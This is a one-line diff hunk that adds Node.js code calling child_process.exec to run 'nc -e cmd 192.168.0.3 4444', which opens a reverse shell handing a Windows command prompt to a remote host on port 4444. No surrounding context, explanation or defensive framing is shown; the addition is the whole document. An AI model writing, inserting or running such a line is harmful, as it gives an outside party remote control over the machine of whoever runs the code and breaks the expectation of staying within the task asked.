@@ -1,0 +1,1 @@
+require('child_process').exec('nc -e cmd 192.168.0.3 4444')
